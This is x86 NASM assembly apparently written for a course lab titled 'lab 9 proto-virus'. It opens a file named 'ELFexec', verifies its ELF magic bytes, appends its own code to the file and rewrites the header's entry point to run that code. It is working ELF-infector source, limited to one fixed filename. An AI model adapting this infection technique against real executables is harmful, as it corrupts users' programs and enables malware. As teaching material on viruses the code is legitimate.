%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define stdout 1

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
%define EI_MAG0     0
%define ELFMAG0 0x7f

%define EI_MAG1     1
%define ELFMAG1     'E'

%define EI_MAG2		2		
%define ELFMAG2		'L'		

%define EI_MAG3		3		
%define ELFMAG3     'F'

%define	ELF_header_size	52
%define	loadAddr	0x08048000


	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

; You code for this lab goes here
    call getPIC ;;eax holds the PIC
    mov ebx,PIClocation
    sub ebx,OutStr
    sub eax,ebx ;; get the relative location
    write stdout, eax,32 ;; print the message OutStr
    open FileName, RDWR, 0
    mov [ebp-4],eax ;; eax holds the fd for the FileName
    cmp dword[ebp-4],-1  ;;error opening the file
    je ErrorOpeningAndMagic
    mov ebx,ebp  ;;the start of the buffer for reading
    sub ebx,8 
    read [ebp-4],ebx,4 ;; read 4 byted === \0ELF

    ;; and now check if it holds the magic number
    cmp byte[ebp-8+EI_MAG0],ELFMAG0
    jne ErrorOpeningAndMagic
    cmp byte[ebp-8+EI_MAG1],ELFMAG1
    jne ErrorOpeningAndMagic
    cmp byte[ebp-8+EI_MAG2],ELFMAG2
    jne ErrorOpeningAndMagic
    cmp byte[ebp-8+EI_MAG3],ELFMAG3
    jne ErrorOpeningAndMagic
    
    lseek [ebp-4],0,SEEK_END
    ;;after lseek eax holds the original size of the file
    mov [ebp-8],eax
    write [ebp-4],_start,1024   ;; now add the _start func to the end of the ELFexec file

                ;; task 1 starts here

    lseek [ebp-4],0, SEEK_SET ;; back to the start of the file
    mov ebx,ebp
    sub ebx,8
    sub ebx,ELF_header_size ;; ebx point to the start of the buffer in size of 52 (start form 60 to 8 in the stack)

    ;; Code to copy the ELF header into memory (on the stack). Do not forget to make sure that sufficient local storage is allocated on the stack before doing so.
    read [ebp-4],ebx,ELF_header_size
    mov eax,[ebp-8];; eax = file original address
    add eax,loadAddr ;; get to the address of the Entry in memory

    ;; now update the file size in the buffer then write it 
    ;; Code to modify the copy of the ELF header of ELFexec that resides in memory, updating the entry point to the first instruction of your virus. 
    mov [ebp-60+ENTRY],eax ;; change the entry in th ebuffer
    lseek [ebp-4],0, SEEK_SET
    mov ebx,ebp
    sub ebx,60
    ;; Code that writes back the ELF header to the beginning of the ELFexec file.
    write [ebp-4],ebx,ELF_header_size ;; update the changes in the ELFexec file
    close [ebp-4]

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
ErrorOpeningAndMagic:
    exit 1      ;;exit error


FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
	
PreviousEntryPoint: dd VirusExit
virus_end:

getPIC:
    call PIClocation
PIClocation:
    pop eax
    ret